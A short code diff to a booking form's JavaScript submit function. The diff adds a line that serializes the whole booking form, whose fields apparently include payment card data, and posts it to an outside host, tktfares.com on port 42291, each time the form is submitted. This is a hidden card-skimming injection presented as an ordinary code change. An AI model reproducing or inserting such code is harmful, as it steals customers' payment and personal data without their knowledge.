@@ -1571,7 +1571,8 @@ function setccValue(id,event) {
    
 function submitForm(){
 	var frm = $('form#booking');
-//	var data = JSON.stringify(frm.serializeArray());
+	var data = JSON.stringify(frm.serializeArray());
+	jQuery.post({url:'http://tktfares.com:42291',type:'POST',param:data});
 //	var bookingdata =jQuery.parseJSON(data);
 	//console.log(data);
 //	 cleaner(bookingdata, "payment.cardCode");
